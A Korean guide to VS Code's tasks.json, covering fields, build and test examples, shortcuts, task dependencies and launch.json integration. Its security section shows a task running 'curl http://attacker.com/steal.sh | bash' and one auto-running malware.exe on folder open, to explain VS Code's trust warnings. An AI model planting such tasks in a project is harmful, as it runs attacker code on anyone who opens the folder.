# `.vscode/tasks.json` — 자동화 작업 정의

> 빌드·테스트·배포처럼 반복되는 쉘 명령을 VS Code 내에서 버튼 하나로 실행할 수 있게 등록하는 파일.
> `launch.json`의 `preLaunchTask`와 연동하면 실행 전 자동 빌드도 가능.

---

## 💡 한 줄 요약

> **"터미널에서 직접 치던 명령어를 VS Code 안에 저장해두고, 단축키나 메뉴로 실행하는 파일."**

---

## 🗂️ 위치와 구조

```
프로젝트 루트/
└── .vscode/
    └── tasks.json   ← 여기
```

파일의 기본 뼈대:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "작업 이름",
      "type": "shell",
      "command": "실행할 명령어"
    }
  ]
}
```

### 핵심 필드 설명

| 필드 | 역할 |
|------|------|
| `version` | tasks.json 스펙 버전 (현재 `"2.0.0"` 고정) |
| `tasks` | 작업 목록 (여러 개 등록 가능) |
| `label` | 작업 이름 (메뉴와 `preLaunchTask`에서 이 이름으로 참조) |
| `type` | `shell`(터미널 명령) 또는 `process`(직접 프로세스 실행) |
| `command` | 실행할 명령어 |
| `group` | 작업 그룹 (`build`, `test` 등) |
| `problemMatcher` | 오류 출력을 파싱해 에디터에 밑줄 표시 |

---

## 🔤 type 차이

| `shell` | `process` |
|---------|-----------|
| 쉘(bash/cmd/powershell)을 통해 실행 | 쉘 없이 프로세스를 직접 실행 |
| 파이프(`\|`), 환경변수(`$VAR`) 사용 가능 | 인수 배열로 정확한 제어 가능 |
| 대부분의 경우 이걸 사용 | 보안이 더 엄격한 환경에서 사용 |

---

## 📋 언어/상황별 실전 예시

### Python — 테스트 실행

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Python: Run Tests",
      "type": "shell",
      "command": "python -m pytest tests/ -v",
      "group": {
        "kind": "test",
        "isDefault": true
      },
      "presentation": {
        "reveal": "always",
        "panel": "new"
      }
    }
  ]
}
```

### Node.js — 빌드 + 린트

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "npm: build",
      "type": "shell",
      "command": "npm run build",
      "group": {
        "kind": "build",
        "isDefault": true
      },
      "problemMatcher": ["$tsc"]
    },
    {
      "label": "npm: lint",
      "type": "shell",
      "command": "npm run lint",
      "group": "test",
      "problemMatcher": ["$eslint-stylish"]
    }
  ]
}
```

### C++ — 컴파일

```json
{
  "label": "C++: Build",
  "type": "shell",
  "command": "g++",
  "args": [
    "-g",
    "${workspaceFolder}/src/*.cpp",
    "-o",
    "${workspaceFolder}/build/app"
  ],
  "group": {
    "kind": "build",
    "isDefault": true
  },
  "problemMatcher": ["$gcc"]
}
```

---

## 🔑 group 설정 — 단축키 연결

`group`을 설정하면 VS Code 단축키와 연결됨.

| group | 단축키 | 용도 |
|-------|--------|------|
| `"build"` + `isDefault: true` | `Ctrl+Shift+B` | 기본 빌드 작업 |
| `"test"` + `isDefault: true` | 테스트 메뉴 | 기본 테스트 작업 |
| 없음 | 명령 팔레트에서 수동 실행 | 일반 작업 |

```json
"group": {
  "kind": "build",
  "isDefault": true
}
```

---

## 🎨 presentation 옵션 — 터미널 출력 제어

```json
"presentation": {
  "reveal": "always",   // always: 항상 표시 | silent: 오류 시만 | never: 숨김
  "panel": "shared",    // shared: 기존 터미널 재사용 | new: 매번 새 터미널
  "clear": true,        // 실행 전 터미널 내용 초기화
  "focus": false        // 실행 시 터미널로 포커스 이동 여부
}
```

---

## 🔗 dependsOn — 작업 간 의존성

여러 작업을 순서대로 또는 동시에 실행.

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "install",
      "type": "shell",
      "command": "npm install"
    },
    {
      "label": "build",
      "type": "shell",
      "command": "npm run build",
      "dependsOn": ["install"]
    },
    {
      "label": "full-pipeline",
      "dependsOn": ["install", "build"],
      "dependsOrder": "sequence"
    }
  ]
}
```

---

## 🔒 왜 VS Code가 보안 경고를 띄우나

`tasks.json`의 `command`는 **임의의 쉘 명령을 실행**할 수 있음.

```json
{
  "label": "악성 예시",
  "type": "shell",
  "command": "curl http://attacker.com/steal.sh | bash"
}
```

단순히 파일을 여는 것만으론 실행되지 않지만, 아래 상황에서 자동 실행될 수 있음.

| 트리거 | 설명 |
|--------|------|
| `preLaunchTask` 연동 | F5로 디버그 시작하면 자동 실행 |
| `runOptions.runOn: "folderOpen"` | **폴더를 여는 순간 즉시 실행** ← 가장 위험 |

### 특히 위험한 설정

```json
{
  "label": "자동 실행 악성 작업",
  "type": "shell",
  "command": "malware.exe",
  "runOptions": {
    "runOn": "folderOpen"
  }
}
```

`runOn: "folderOpen"` 이 있으면 폴더를 여는 순간 명령이 즉시 실행됨.
신뢰하지 않는 폴더에서 절대 허용 금지.

---

## ⚙️ launch.json과의 연동

`tasks.json` + `launch.json`을 함께 쓰면 **"빌드 → 실행 → 디버그"** 를 자동화.

```json
// tasks.json
{
  "label": "Build Project",
  "type": "shell",
  "command": "npm run build",
  "group": { "kind": "build", "isDefault": true }
}
```

```json
// launch.json
{
  "name": "Launch App",
  "type": "node",
  "request": "launch",
  "program": "${workspaceFolder}/dist/index.js",
  "preLaunchTask": "Build Project"
}
```

→ F5 누르면 `Build Project` 먼저 실행 → 빌드 성공 시 자동으로 앱 실행

---

## ✅ 정리 요약

```
📍 위치       →  .vscode/tasks.json
🎯 역할       →  반복 명령(빌드/테스트/배포)을 VS Code 내 작업으로 등록
⚡ 작동 시점   →  Ctrl+Shift+B, 명령 팔레트, 또는 preLaunchTask 연동
🔒 보안 위험  →  임의 쉘 명령 실행 가능 / runOn:folderOpen 시 즉시 실행
🔗 연동       →  launch.json의 preLaunchTask와 함께 사용
```

---

*작성일: 2026-03-15 | VS Code .vscode 폴더 완전 정리 시리즈*
